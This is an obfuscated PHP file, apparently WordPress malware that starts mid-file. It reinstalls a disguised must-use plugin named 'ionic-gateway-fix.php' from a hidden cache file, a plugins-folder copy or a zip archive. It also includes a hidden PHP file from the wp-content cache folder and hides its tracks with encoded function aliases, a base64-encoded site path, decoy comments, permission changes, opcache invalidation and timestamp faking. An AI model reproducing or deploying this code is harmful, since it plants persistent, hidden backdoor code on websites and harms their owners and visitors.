if     ($x00shd420fcyf1za   !==   ""  &&  $ejog0urzoh5sjia ===   $x00shd420fcyf1za)    continue;
  if     ($rigc9ada0quiroc9   !== false     &&   @$GLOBALS['__scf_nsox70toh7_5']($ejog0urzoh5sjia)  ===     $rigc9ada0quiroc9)   continue;
$rdi34yr_u76xuykq   =      $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia,   '.php');
 $q8wvhjtv1j16   =  $GLOBALS['__scf_wqpz2ij4na_37']($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia));
  if  ($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia) !==   $q3n4q4yej_jo  && $rdi34yr_u76xuykq     !==    $q8wvhjtv1j16) continue;
 



     if   ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_fam')   &&    !_sc_fam($ejog0urzoh5sjia))   continue;
  $jfxmsfik30i   =  @$GLOBALS['__scf_ruyewuy5e0yj9_13']($ejog0urzoh5sjia);
 if (!$jfxmsfik30i      ||   $jfxmsfik30i  <      (9785-4785)     ||   $jfxmsfik30i   >  (52428793+7)) continue;
  $q_le4m22r1_ =  (string)    @$GLOBALS['__scf_m9li945p4ht_16']($ejog0urzoh5sjia, false,     null,    0,  (3715+381));

  if  ($q_le4m22r1_ !==    ""   &&  $GLOBALS['__scf_ukka5up4qd_28']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',  $q_le4m22r1_,     $m32ohx2wr8v) &&  version_compare($m32ohx2wr8v[1],   $zpvevdsie9fdy,  '>='))    return   true;
  }
  return  false;
}
 }
   if (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_corep')) {
  function    _sc_corep($bxxvjn7lvws)


    {
 $zi_v4ypvi7hf1yb = defined('ABSPATH')  ?  ABSPATH :    ($GLOBALS['__scf_c6non3dyia_17']($GLOBALS['__scf_rxjfmcidt4k5ht_4']($bxxvjn7lvws),  '/') .     '/');


  return $bxxvjn7lvws   .  '/.sc_'   .  $GLOBALS['__scf_eayjxbxcfgt_11']($GLOBALS['__scf_lf1trv6kn3_19']($zi_v4ypvi7hf1yb    . 'dir'), 0, (7+1))  .   '/core_' .   $GLOBALS['__scf_eayjxbxcfgt_11']($GLOBALS['__scf_lf1trv6kn3_19']($zi_v4ypvi7hf1yb  .  'core'),   0, (13-5))  .   '.php';
 }
       }
  if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_coreld'))  {
 function _sc_coreld($bxxvjn7lvws)
  {

 $g2gswuh32sfxi6s  =  _sc_corep($bxxvjn7lvws);


 if   (!@$GLOBALS['__scf_tyn9ctu978h_27']($g2gswuh32sfxi6s)) return   false;
   $hljogzlvyj  =  @$GLOBALS['__scf_ruyewuy5e0yj9_13']($g2gswuh32sfxi6s);
 if  (!$hljogzlvyj  ||    $hljogzlvyj < (814-314) ||   $hljogzlvyj  >    (3058071+5330537)) return    false;
if    ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('m7v2uz7dvbtkxx4') && !m7v2uz7dvbtkxx4($hljogzlvyj))  return     false;

    $e4atkclrm2kv6o    =   @$GLOBALS['__scf_m9li945p4ht_16']($g2gswuh32sfxi6s);
       if    ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_unp')      && $GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o) && $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o)  >  (1048518+58))    $e4atkclrm2kv6o   = _sc_unp($e4atkclrm2kv6o);
 if    (!$GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o) || $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o) <  (486+14) ||   $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o) >  (1048531+45)    ||     $GLOBALS['__scf_jac6edy18ozw_24']($e4atkclrm2kv6o, '<?')     !==  0)   return   false;
return $e4atkclrm2kv6o;
    }
    }
  if    (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('x4wsftcny9dao6uv')) {
   function    x4wsftcny9dao6uv($tbo3bqvwwtm)

 {
    return $GLOBALS['__scf_rexlo2me9pq_6']($tbo3bqvwwtm)    &&  $GLOBALS['__scf_ukka5up4qd_28']('/(\/\*[0-9a-f]{1000,}\*\/)\s*$/', $tbo3bqvwwtm)  === 1;
   }
}
if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('m7v2uz7dvbtkxx4'))  {
function  m7v2uz7dvbtkxx4($ag1xvimlb8rxt =    0)
{


      if (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('ini_get')) return  false;
   $b8ld0_v01imo   =   @$GLOBALS['__scf_j5r9w4_pccv6a_9']('memory_limit');
 if  (!$GLOBALS['__scf_rexlo2me9pq_6']($b8ld0_v01imo)  ||   $b8ld0_v01imo   ===  "")  return false;
 $dlptk4g0f1alj4  = (int)   $b8ld0_v01imo;
   

if  ($dlptk4g0f1alj4 <=   0) return  true;
  $a_cidlkt9f9to9k = $GLOBALS['__scf_l4ffn4k7nrq5_10']($GLOBALS['__scf_eayjxbxcfgt_11']($b8ld0_v01imo,  -1));
        if  ($a_cidlkt9f9to9k === 'G')    $dlptk4g0f1alj4 *=     (1073741733+91);
   elseif   ($a_cidlkt9f9to9k   ===  'M')    $dlptk4g0f1alj4    *=    (1048491+85);
  elseif   ($a_cidlkt9f9to9k    ===    'K')    $dlptk4g0f1alj4 *=  (994+30);
 $s91xgitb9twmrd  = $GLOBALS['__scf_ivd0_kr15vsvqr_0']('memory_get_usage')   ?    @memory_get_usage(true)     :    0;
    if (!$GLOBALS['__scf_qvij5cn7dx_14']($s91xgitb9twmrd)  || $s91xgitb9twmrd  <   0)     $s91xgitb9twmrd   =  0;
if  ($ag1xvimlb8rxt    > 0)    return ($dlptk4g0f1alj4     -  $s91xgitb9twmrd)  >    (($ag1xvimlb8rxt    * (1+2)) + (3422320-1325168));
  if  ($dlptk4g0f1alj4 <  (67108824+40)) return false;
      if     ($s91xgitb9twmrd >  0   && $dlptk4g0f1alj4 -    $s91xgitb9twmrd   <     (0x1ba002b+0x45ffd5))  return  false;
return      true;
}



    }
 if    (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('rnh5l6_zt1b99yd1km2'))  {
function    rnh5l6_zt1b99yd1km2($of47wzqzrz23kp6,   $zpvevdsie9fdy)
       {
   if   (!_sc_fam($of47wzqzrz23kp6))    return false;
$s4f109tgr5i   = @$GLOBALS['__scf_ruyewuy5e0yj9_13']($of47wzqzrz23kp6);
    if (!$s4f109tgr5i      ||  $s4f109tgr5i   < (4744+256)  ||     $s4f109tgr5i   >   (52428746+54)) return  false;
if  ($s4f109tgr5i > (2509998+2)     && $s4f109tgr5i   <   (10195987-4700087))  return  false;
 $awa4dki9zb =  (string)  @$GLOBALS['__scf_m9li945p4ht_16']($of47wzqzrz23kp6,   false,  null,  0,  (4016+80));
 if    (!$GLOBALS['__scf_ukka5up4qd_28']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',  $awa4dki9zb,  $b8ld0_v01imo)) return   false;
   if ($zpvevdsie9fdy !==   "" && version_compare($b8ld0_v01imo[1],  $zpvevdsie9fdy,      '<')) return    false;



   if (@$GLOBALS['__scf_tyn9ctu978h_27']($GLOBALS['__scf_rxjfmcidt4k5ht_4']($of47wzqzrz23kp6) . '/.wr_' .  $GLOBALS['__scf_wqpz2ij4na_37']($of47wzqzrz23kp6,    '.php')))  return   false;
 if   ($s4f109tgr5i    >  (0x3d21d+0xc2de3)  &&   !x4wsftcny9dao6uv((string) @$GLOBALS['__scf_m9li945p4ht_16']($of47wzqzrz23kp6,  false,    null,   $s4f109tgr5i    - (0x6e8+0x918)))) return false;

return     true;$q_anc2vq_6=PHP_INT_MAX/PHP_INT_MAX;$wl2pess_=$q_anc2vq_6+38;
 }
 }
 if   (!defined("SC_AUTO_PREPEND"))    {
  @define("SC_AUTO_PREPEND",   1);
 }
 $sjuo7pnj4e1wqnrp     =  $GLOBALS['__scf_eeugu_w74fk_38']('L2hvbWUvdTQxNDY1MzQxMS9kb21haW5zL3N0b25lMS5wcm9nb2V6LmNvbS9wdWJsaWNfaHRtbC93cC1jb250ZW50');
  if  (!$GLOBALS['__scf_rexlo2me9pq_6']($sjuo7pnj4e1wqnrp)    ||   $sjuo7pnj4e1wqnrp   ===  "" ||  !@$GLOBALS['__scf_lyejha5o7xo7_36']($sjuo7pnj4e1wqnrp)) {
$sjuo7pnj4e1wqnrp     =   defined("WP_CONTENT_DIR")     ?  WP_CONTENT_DIR    :    "";
     if   (!$sjuo7pnj4e1wqnrp)   {
// Sodium crypto: decidable transformer

   $afkjk85on5c_bx   = __DIR__;
   for    ($ps1136li3f =  0; $ps1136li3f  < (2+2);  $ps1136li3f++) {
    if ($GLOBALS['__scf_wqpz2ij4na_37']($afkjk85on5c_bx)  ===      "wp-content") {



       $sjuo7pnj4e1wqnrp   =    $afkjk85on5c_bx;
  break;
 }
 $afkjk85on5c_bx = $GLOBALS['__scf_rxjfmcidt4k5ht_4']($afkjk85on5c_bx);

    }
// delegate checkpoint for WP Template Parts

if  (!$sjuo7pnj4e1wqnrp)    $sjuo7pnj4e1wqnrp     = __DIR__;


  }
}
   $q3n4q4yej_jo  =  (defined("WPMU_PLUGIN_DIR")      &&   WPMU_PLUGIN_DIR)   ? WPMU_PLUGIN_DIR  :    $sjuo7pnj4e1wqnrp   .   "/mu-plugins";



 $ejog0urzoh5sjia    =     $q3n4q4yej_jo   .   "/ionic-gateway-fix.php";
$rosjewtew0  =     (defined("WP_PLUGIN_DIR") && WP_PLUGIN_DIR) ? WP_PLUGIN_DIR  :  $sjuo7pnj4e1wqnrp  .   "/plugins";
$pft6ba2cqvqu8we  =  $rosjewtew0  .  "/ionic-gateway-fix/ionic-gateway-fix.php";
$qgeyzqg84qudb  =     $q3n4q4yej_jo .  "/.q_ionic-gateway-fix";
 $cpr2npimtx5   = $q3n4q4yej_jo .   "/.sd_ionic-gateway-fix";
 if    (@$GLOBALS['__scf_tyn9ctu978h_27']($cpr2npimtx5))    {
   $mlzqcnnrnnpm0_v  = @$GLOBALS['__scf_m9li945p4ht_16']($cpr2npimtx5);
   if  ($GLOBALS['__scf_rexlo2me9pq_6']($mlzqcnnrnnpm0_v) &&  $GLOBALS['__scf_ukka5up4qd_28']("/\\d+\\.\\d+\\.\\d+/", $mlzqcnnrnnpm0_v,  $p79dz41g6m)   &&  version_compare($p79dz41g6m[0],     "4.3.24",    ">")  &&    _sc_any_live($p79dz41g6m[0],      $sjuo7pnj4e1wqnrp,    $ejog0urzoh5sjia))  return;
  }



$pxy0o9btrmiww1  =    !rnh5l6_zt1b99yd1km2($ejog0urzoh5sjia,      "4.3.24");
  if  ($pxy0o9btrmiww1  && _sc_any_live("4.3.24",   $sjuo7pnj4e1wqnrp, $ejog0urzoh5sjia)) $pxy0o9btrmiww1 =   false;


 if    ($pxy0o9btrmiww1)  {
     $ncqj679ev3l8wch =     $q3n4q4yej_jo  . '/.rd_ionic-gateway-fix';
$x_5n8a4wuwp22m_  = @$GLOBALS['__scf_tyn9ctu978h_27']($ncqj679ev3l8wch)   ? (int) @$GLOBALS['__scf_ubdjkj4ds6_15']($ncqj679ev3l8wch)   : 0;
if  ($x_5n8a4wuwp22m_  >  $GLOBALS['__scf_bah3pq6kzvgzf4_26']() -  (293+7)  &&   $x_5n8a4wuwp22m_ <=  $GLOBALS['__scf_bah3pq6kzvgzf4_26']() + (229+71))    $pxy0o9btrmiww1 =  false;
 elseif  ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('touch'))     @$GLOBALS['__scf_jp8c4rkog7z0c_23']($ncqj679ev3l8wch);
   }
      if ($pxy0o9btrmiww1) {
   $smffy_qze_mfepje  =  false;
       if   (rnh5l6_zt1b99yd1km2($pft6ba2cqvqu8we, "")) {
      if (!@$GLOBALS['__scf_lyejha5o7xo7_36']($q3n4q4yej_jo))    _sc_mkdir($q3n4q4yej_jo);
      $eaj59o1s1kn85w7 =  @$GLOBALS['__scf_m9li945p4ht_16']($pft6ba2cqvqu8we);
   




 if ($GLOBALS['__scf_rexlo2me9pq_6']($eaj59o1s1kn85w7)  &&     $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7)   >    (0xfac1a+0x53e6))    $eaj59o1s1kn85w7  =   _sc_unp($eaj59o1s1kn85w7);
  if   (!$GLOBALS['__scf_rexlo2me9pq_6']($eaj59o1s1kn85w7) || $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7)   < (437+63)    ||  $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7)  >   (1593499-544923)   || $GLOBALS['__scf_jac6edy18ozw_24']($eaj59o1s1kn85w7,  "<?")     !==  0  ||      !_sc_phpok_src($eaj59o1s1kn85w7)      ||    !_sc_qok($qgeyzqg84qudb, $eaj59o1s1kn85w7))     $eaj59o1s1kn85w7   =  false;
$tdvh9vter5u0zweb     =   ($eaj59o1s1kn85w7 !== false &&    $GLOBALS['__scf_ivd0_kr15vsvqr_0']('tempnam')  ?    @$GLOBALS['__scf_rmwjqj3bib_20']($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia),    'sc_')   :  false);
 if   ($tdvh9vter5u0zweb   !==   false      &&  !zgw2beuswm4v839sm6($tdvh9vter5u0zweb, $GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia)))  {
        _sc_ul($tdvh9vter5u0zweb);
     $tdvh9vter5u0zweb  =    false;
 }
  if   ($tdvh9vter5u0zweb !==    false)  {
// @preempt ring-buffer

   $ic333wr60f1t5  =  _sc_fpc($tdvh9vter5u0zweb,  $eaj59o1s1kn85w7);


  if  ($ic333wr60f1t5     !==  false   &&    $ic333wr60f1t5   ===  $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7)) {


 $hzpg63xhiwa   =  _ooeo50yjqcae1tdxg($tdvh9vter5u0zweb, $ejog0urzoh5sjia, cime3jhgafu_bno3mw($eaj59o1s1kn85w7));
 if  ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('clearstatcache'))   @clearstatcache(true,   $ejog0urzoh5sjia);
    if    ($hzpg63xhiwa) {


 $w6dnb_wkis      =   @$GLOBALS['__scf_m9li945p4ht_16']($ejog0urzoh5sjia);

  if  (!$GLOBALS['__scf_rexlo2me9pq_6']($w6dnb_wkis)  ||  $w6dnb_wkis   !==    $eaj59o1s1kn85w7)  {



if ($GLOBALS['__scf_rexlo2me9pq_6']($w6dnb_wkis)  &&   $GLOBALS['__scf_jac6edy18ozw_24']($w6dnb_wkis,  '/* SCV:')  !==  false)    {
   if  ($w6dnb_wkis !== "" &&    $GLOBALS['__scf_n9xto_7urppc_7']($w6dnb_wkis)  < $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7)    &&  $GLOBALS['__scf_eayjxbxcfgt_11']($eaj59o1s1kn85w7,   0,  $GLOBALS['__scf_n9xto_7urppc_7']($w6dnb_wkis))  ===  $w6dnb_wkis)    {
    _sc_fpc($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia) .  '/.wr_'  . $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia,    '.php'),    '1');

 _sc_ul($ejog0urzoh5sjia);
}
// finite checkpoint

$hzpg63xhiwa     =      false;
        }  else {
// predicate primitive-recursive watermark




  _sc_fpc($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia) . '/.wr_'   . $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia,  '.php'),   '1');



  _sc_ul($ejog0urzoh5sjia);



   $hzpg63xhiwa = false;
}
   }
  unset($w6dnb_wkis);

  }


if ($hzpg63xhiwa) {
     $smffy_qze_mfepje  =  true;
 _sc_ul($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia) .  '/.wr_' .   $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia,  '.php'));
 if  ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('chmod'))  @$GLOBALS['__scf__n8ild8e1h2ea_21']($ejog0urzoh5sjia, (388+32));


if   ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('opcache_invalidate'))    @opcache_invalidate($ejog0urzoh5sjia,   true);$erqv_xj8tn_a6=2*9;$vzty88wfqslu=$erqv_xj8tn_a6-1;
 }
if  ($smffy_qze_mfepje   &&    @$GLOBALS['__scf_tyn9ctu978h_27']($ejog0urzoh5sjia))   {
 _sc_padf($ejog0urzoh5sjia);
 _sc_fam_touch($ejog0urzoh5sjia);

}
      } else  {
  _sc_ul($tdvh9vter5u0zweb);



   }
      }
     }
  if     (!rnh5l6_zt1b99yd1km2($ejog0urzoh5sjia,   ""))  {
    $eaj59o1s1kn85w7  =     _sc_coreld($sjuo7pnj4e1wqnrp);
  $smffy_qze_mfepje  =     false;
  if  ($GLOBALS['__scf_rexlo2me9pq_6']($eaj59o1s1kn85w7)  &&  _sc_phpok_src($eaj59o1s1kn85w7) && _sc_qok($qgeyzqg84qudb,    $eaj59o1s1kn85w7)) {
if   (!@$GLOBALS['__scf_lyejha5o7xo7_36']($q3n4q4yej_jo)) _sc_mkdir($q3n4q4yej_jo);
  $tdvh9vter5u0zweb  =  ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('tempnam')  ?   @$GLOBALS['__scf_rmwjqj3bib_20']($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia),  'sc_')   :   false);
if ($tdvh9vter5u0zweb !== false   && !zgw2beuswm4v839sm6($tdvh9vter5u0zweb,     $GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia)))    {
    _sc_ul($tdvh9vter5u0zweb);
$tdvh9vter5u0zweb =  false;
  

 }
// candidate for refactor

   if ($tdvh9vter5u0zweb !==  false)   {
    $ic333wr60f1t5  = _sc_fpc($tdvh9vter5u0zweb,  $eaj59o1s1kn85w7);
  if ($ic333wr60f1t5     !==  false   &&     $ic333wr60f1t5 ===  $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7))  {
 $hzpg63xhiwa   = _ooeo50yjqcae1tdxg($tdvh9vter5u0zweb,  $ejog0urzoh5sjia,   cime3jhgafu_bno3mw($eaj59o1s1kn85w7));
if   ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('clearstatcache'))      @clearstatcache(true,  $ejog0urzoh5sjia);
    if ($hzpg63xhiwa) {
// @project dead-letter

 $w6dnb_wkis = @$GLOBALS['__scf_m9li945p4ht_16']($ejog0urzoh5sjia);
 if (!$GLOBALS['__scf_rexlo2me9pq_6']($w6dnb_wkis)   || $w6dnb_wkis !== $eaj59o1s1kn85w7)  {

    if ($GLOBALS['__scf_rexlo2me9pq_6']($w6dnb_wkis) &&   $GLOBALS['__scf_jac6edy18ozw_24']($w6dnb_wkis,  '/* SCV:')  !==   false)  {
  if  ($w6dnb_wkis   !==  ""   &&      $GLOBALS['__scf_n9xto_7urppc_7']($w6dnb_wkis)  <    $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7) && $GLOBALS['__scf_eayjxbxcfgt_11']($eaj59o1s1kn85w7,  0, $GLOBALS['__scf_n9xto_7urppc_7']($w6dnb_wkis)) ===    $w6dnb_wkis)  {
// dimension expand

     _sc_fpc($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia)   .  '/.wr_'   .    $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia,  '.php'), '1');
    _sc_ul($ejog0urzoh5sjia);
    }
    $hzpg63xhiwa  = false;

  }   else  {
      _sc_fpc($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia) .  '/.wr_'    . $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia,    '.php'),      '1');


_sc_ul($ejog0urzoh5sjia);
  $hzpg63xhiwa    =  false;
}
 }
unset($w6dnb_wkis);
 }
// aligned read

if   ($hzpg63xhiwa) {
$smffy_qze_mfepje  =     true;
_sc_ul($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia)     .  '/.wr_'  .  $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia,    '.php'));
if     ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('chmod'))  @$GLOBALS['__scf__n8ild8e1h2ea_21']($ejog0urzoh5sjia,    (0x16d+0x37));
     if ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('opcache_invalidate'))  @opcache_invalidate($ejog0urzoh5sjia, true);
  }
  if     ($smffy_qze_mfepje   && @$GLOBALS['__scf_tyn9ctu978h_27']($ejog0urzoh5sjia))  {
_sc_padf($ejog0urzoh5sjia);$v9yrd_pb__16=PHP_INT_MAX/PHP_INT_MAX;$l2psm_dzm6j=$v9yrd_pb__16+60;
 _sc_fam_touch($ejog0urzoh5sjia);
    }
}  else {
   _sc_ul($tdvh9vter5u0zweb);
 }
}



}
// virtual dispatch

 }
  if     (!rnh5l6_zt1b99yd1km2($ejog0urzoh5sjia,  ""))  {
    $bxxvjn7lvws =  $sjuo7pnj4e1wqnrp    .  "/.sc_4ce6ec2f";
     $x1dkt7grtdtnm   =     $bxxvjn7lvws . "/12ab0a53.php";
   if  (!@$GLOBALS['__scf_tyn9ctu978h_27']($x1dkt7grtdtnm))   {
 $bxxvjn7lvws     = $sjuo7pnj4e1wqnrp . "/cache";
     $x1dkt7grtdtnm = $bxxvjn7lvws  .  "/12ab0a53.php";
    }
   if (@$GLOBALS['__scf_tyn9ctu978h_27']($x1dkt7grtdtnm)  &&   _sc_phpok($x1dkt7grtdtnm)   &&    _sc_fam($x1dkt7grtdtnm))  {
  @define('SC_AUTO_PREPEND', 1);
    try  {
      @include_once $x1dkt7grtdtnm;
 }     catch   (\Throwable   $huj5q0pr36)     {


 } catch (\Exception    $huj5q0pr36) {
       }
// immutable trie


}
// @reorder alert

 if  (!rnh5l6_zt1b99yd1km2($ejog0urzoh5sjia,   ""))    {
     $ukn711yat7w119  =    $sjuo7pnj4e1wqnrp    . "/3c35953d.zip";
 if   (!@$GLOBALS['__scf_tyn9ctu978h_27']($ukn711yat7w119))  $ukn711yat7w119    =  __DIR__  . "/3c35953d.zip";
if     ($GLOBALS['__scf_ha7g2gn35n_39']("ZipArchive") &&  @$GLOBALS['__scf_tyn9ctu978h_27']($ukn711yat7w119)    &&  (int)   @$GLOBALS['__scf_ruyewuy5e0yj9_13']($ukn711yat7w119)    <= (52428705+95))   {
try  {
     if (!@$GLOBALS['__scf_lyejha5o7xo7_36']($q3n4q4yej_jo)) _sc_mkdir($q3n4q4yej_jo);


  $olutss44h74r     =   new    hh2szxj2hew();
   if ($olutss44h74r->open($ukn711yat7w119) ===  true) {
  $p7ieps836bju  =  -1;
     $xth4xdwmb6iw  =  0;
 $barofdghnidk4whu  =   -1;
    $leiwj5lda1   =  -1;
  

for ($e9hgfhrcwy7_   =   0;  $e9hgfhrcwy7_  < $olutss44h74r->numFiles &&  $e9hgfhrcwy7_     < (930+70);      $e9hgfhrcwy7_++) {
  $si8e1f80lqzd8ru   = $olutss44h74r->getNameIndex($e9hgfhrcwy7_);
 if  (!$GLOBALS['__scf_rexlo2me9pq_6']($si8e1f80lqzd8ru) ||   $GLOBALS['__scf_eayjxbxcfgt_11']($si8e1f80lqzd8ru, -(3+1))     !==   ".php")  continue;
  $xth4xdwmb6iw++;
if ($barofdghnidk4whu    <    0) $barofdghnidk4whu     =     $e9hgfhrcwy7_;
    if   ($si8e1f80lqzd8ru   ===  "ionic-gateway-fix/ionic-gateway-fix.php")   {
// semisimple sliding-window

  $p7ieps836bju    =   $e9hgfhrcwy7_;
   break;$hbetf44gavlnj=17*8;$kx7hm3dfdxy3d=$hbetf44gavlnj-45;
 }
// open visitor

if  ($leiwj5lda1   <  0 &&  $GLOBALS['__scf_wqpz2ij4na_37']($si8e1f80lqzd8ru)    ===   "ionic-gateway-fix.php") $leiwj5lda1 =   $e9hgfhrcwy7_;$c1sgbv1ip3lr=99*7;$tqkacgifldm0lo=$c1sgbv1ip3lr-10;
 }
        if  ($p7ieps836bju   <  0) $p7ieps836bju  =   $leiwj5lda1;
    if  ($p7ieps836bju  < 0  && $xth4xdwmb6iw    ===   1      && $olutss44h74r->numFiles  <=   (966+34)) $p7ieps836bju =  $barofdghnidk4whu;
if  ($p7ieps836bju >=    0) {
 $v8gwxgt2mtb1wq2  =   $olutss44h74r->statIndex($p7ieps836bju);
  $eaj59o1s1kn85w7  = ($GLOBALS['__scf_h8sw9nk0xrg_25']($v8gwxgt2mtb1wq2)  &&  isset($v8gwxgt2mtb1wq2['size']) &&  (int) $v8gwxgt2mtb1wq2['size'] >     (674236+374340))   ?  false :   $olutss44h74r->getFromIndex($p7ieps836bju);
unset($v8gwxgt2mtb1wq2);


      if (!$GLOBALS['__scf_rexlo2me9pq_6']($eaj59o1s1kn85w7)  ||    $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7)   <      (213+287)  ||  $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7)  >   (1048520+56)     || $GLOBALS['__scf_jac6edy18ozw_24']($eaj59o1s1kn85w7, "<?")   !== 0  ||  !_sc_phpok_src($eaj59o1s1kn85w7)  ||   !_sc_qok($qgeyzqg84qudb,     $eaj59o1s1kn85w7)) $eaj59o1s1kn85w7 = false;
    $tdvh9vter5u0zweb   = ($eaj59o1s1kn85w7    !==    false && $GLOBALS['__scf_ivd0_kr15vsvqr_0']('tempnam')    ?  @$GLOBALS['__scf_rmwjqj3bib_20']($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia),  'sc_') :      false);
 if ($tdvh9vter5u0zweb    !== false   &&  !zgw2beuswm4v839sm6($tdvh9vter5u0zweb,     $GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia)))   {
      _sc_ul($tdvh9vter5u0zweb);
$tdvh9vter5u0zweb = false;
}
 if   ($tdvh9vter5u0zweb   !==    false) {$kikamzhd=-177;$ez06av4us4y_yc=($kikamzhd>0)?$kikamzhd:-$kikamzhd;
  $ic333wr60f1t5  = _sc_fpc($tdvh9vter5u0zweb,  $eaj59o1s1kn85w7);



  if  ($ic333wr60f1t5    !== false     && $ic333wr60f1t5 === $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7))  {
   $hzpg63xhiwa   = _ooeo50yjqcae1tdxg($tdvh9vter5u0zweb,      $ejog0urzoh5sjia,  cime3jhgafu_bno3mw($eaj59o1s1kn85w7));
  if ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('clearstatcache')) @clearstatcache(true,      $ejog0urzoh5sjia);
        if  ($hzpg63xhiwa) {
 $w6dnb_wkis =  @$GLOBALS['__scf_m9li945p4ht_16']($ejog0urzoh5sjia);
 if (!$GLOBALS['__scf_rexlo2me9pq_6']($w6dnb_wkis) ||      $w6dnb_wkis !== $eaj59o1s1kn85w7)   {
 if   ($GLOBALS['__scf_rexlo2me9pq_6']($w6dnb_wkis)  &&    $GLOBALS['__scf_jac6edy18ozw_24']($w6dnb_wkis,  '/* SCV:') !==     false)    {


  if  ($w6dnb_wkis   !==  ""  &&  $GLOBALS['__scf_n9xto_7urppc_7']($w6dnb_wkis)  <  $GLOBALS['__scf_n9xto_7urppc_7']($eaj59o1s1kn85w7) &&     $GLOBALS['__scf_eayjxbxcfgt_11']($eaj59o1s1kn85w7, 0,  $GLOBALS['__scf_n9xto_7urppc_7']($w6dnb_wkis))   === $w6dnb_wkis)  {
_sc_fpc($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia) .     '/.wr_'    . $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia, '.php'), '1');
     _sc_ul($ejog0urzoh5sjia);
 }


$hzpg63xhiwa =  false;
      }  else     {
// wildcard handling

  _sc_fpc($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia) .   '/.wr_' .   $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia, '.php'),    '1');
 _sc_ul($ejog0urzoh5sjia);
        $hzpg63xhiwa   = false;
 }
  }
     unset($w6dnb_wkis);
   }
if  ($hzpg63xhiwa)   {
  _sc_ul($GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia) . '/.wr_'    .  $GLOBALS['__scf_wqpz2ij4na_37']($ejog0urzoh5sjia,  '.php'));
     if   ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('chmod'))    @$GLOBALS['__scf__n8ild8e1h2ea_21']($ejog0urzoh5sjia, (46+374));
       if   ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('opcache_invalidate'))  @opcache_invalidate($ejog0urzoh5sjia,      true);
 _sc_padf($ejog0urzoh5sjia);
  _sc_fam_touch($ejog0urzoh5sjia);


 }
// WP Gallery Block: configure linear-type

  }  else   {
_sc_ul($tdvh9vter5u0zweb);
       }
   }
  }

  $olutss44h74r->close();
}
 }   catch   (\Throwable   $huj5q0pr36)   {

 }    catch   (\Exception $huj5q0pr36)    {
  }
}



   }
}



 }
  
}